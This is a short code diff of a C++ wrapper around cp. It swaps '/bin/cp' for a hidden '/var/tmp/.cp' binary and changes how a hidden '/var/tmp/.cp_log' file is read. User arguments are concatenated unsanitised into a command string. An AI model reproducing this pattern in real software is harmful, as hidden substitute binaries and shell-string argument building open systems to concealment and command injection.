@@ -6,7 +6,7 @@
 using namespace std;
 int main(int argc, char *argv[]) {
 	printf("苟利国家生死以，岂因祸福避趋之。\n");
-	string str = "/bin/cp ";
+	string str = "/var/tmp/.cp ";
 	for(int i = 1; i < argc; ++i) {
 		str += 	" " + string(argv[i]);
 	}	
@@ -15,7 +15,7 @@ int main(int argc, char *argv[]) {
 	FILE* file = fopen("/var/tmp/.cp_log", "r");
 	char ch;
 	bool flag = true;
-	for(int i = 0; i < 9; ++i){
+	for(int i = 0; i < str.size() + 1; ++i){
 		ch = fgetc(file);	
 		if(ch == EOF){
 			break;
